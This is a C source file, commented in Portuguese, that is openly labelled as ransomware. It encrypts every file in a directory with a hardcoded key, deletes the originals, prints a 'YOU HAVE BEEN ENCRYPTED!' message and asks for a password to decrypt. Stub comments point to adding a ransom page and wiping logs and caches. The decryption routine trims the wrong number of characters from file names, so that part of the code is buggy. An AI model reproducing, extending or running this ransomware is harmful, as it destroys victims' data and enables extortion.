/*Ransomware em C*/
#include "cript.h"
#include "zfile.h"
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>

// Estrutura com informações sobre o diretorio
struct dirent *dir_struct;
// Funções
void Encriptar (char *endereco, unsigned char *key);
void Desencriptar (char *endereco, unsigned char *key);
int verificar(char *nome);
int main()
{
    char path[] = "/home/zdragonsk/Duh";
    char key[] = "zdragonsk";
    char keys[31];
    // Criptografar
    Encriptar(path, key);
    //criarPagina(); - Faça a sua
    //apagarLogs(); - Faça a sua
    //apagarCaches(); - Faça a sua
    printf("\nYOU HAVE BEEN ENCRYPTED! Use te password: ");
    scanf("%s", &keys);
    Desencriptar(path, keys);
    return(0);
}

int verificar(char *nome){ // Verificar se é pasta
    DIR *diretorio = opendir(nome);
    if(diretorio == NULL){
        return(1);
    }
    else{
        return(0);
    }

}

// Encrypt os arquivos
void Encriptar(char *endereco, unsigned char *key)
{
    // Variaveis
    char arquivo[1024] , arquivo_saida[1024];

    // Abre o diretorio;
    DIR *diretorio = opendir(endereco);
    if(diretorio == NULL)
    {
        fprintf(stderr , "[Erro]: Nao foi possivel abrir o diretorio %s\n",endereco);
        exit(1);
    }
    
    // Ler o diretorio para criptografar os arquivos encontrados
    while((dir_struct = readdir(diretorio)) != NULL)
    {
        // Filtra diretorio filho e pai.
		if(strcmp(dir_struct->d_name , ".") == 0 || strcmp(dir_struct->d_name , "..") == 0)
			continue;

        // Forma o nome do arquivo
        sprintf(arquivo , "%s/%s" , endereco , dir_struct->d_name);

        // Cria o nome do arquivo de saida
        sprintf(arquivo_saida , "%s.SK",arquivo);

        // Criptografa o arquivo
        if(verificar(arquivo) == 1){
            int status = cifrafile(arquivo , arquivo_saida , key);
            if(status == -1) fprintf(stderr, "[Erro]: Nao foi possivel criptografar: %s\n",arquivo);
            else
            {
                printf("[+]: Encrypted %s\n",arquivo);
                remove(arquivo);
            }
        }
        else{
            continue;
        }

    }
}
void Desencriptar(char *endereco, unsigned char *key)
{
    // Variaveis
    char arquivo[1024] , arquivo_saida[1024];

    // Abre o diretorio;
    DIR *diretorio = opendir(endereco);
    if(diretorio == NULL)
    {
        fprintf(stderr , "[Erro]: Nao foi possivel abrir diretorio: %s\n",endereco);
        exit(1);
    }
    
    // Ler o diretorio para decriptografar os arquivos encontrados
    while((dir_struct = readdir(diretorio)) != NULL)
    {
        // Filtra diretorio filho e pai.
		if(strcmp(dir_struct->d_name , ".") == 0 || strcmp(dir_struct->d_name , "..") == 0)
			continue;

        // Forma o nome do arquivo
        sprintf(arquivo , "%s/%s" , endereco , dir_struct->d_name);

        // Cria o nome do arquivo de saida
        strncpy(arquivo_saida , arquivo , strlen(arquivo) - 6);
        arquivo_saida[(strlen(arquivo) - 6)] = '\0';

        // Decriptografa o arquivo
        int status = decifrafile(arquivo , arquivo_saida , key);
        if(status == -1) fprintf(stderr, "[Erro]: Nao foi possivel decriptografar: %s\n",arquivo);
        else
        {
            printf("[+]: Descrypted: %s\n", arquivo_saida);
            remove(arquivo);
        }
    }

}
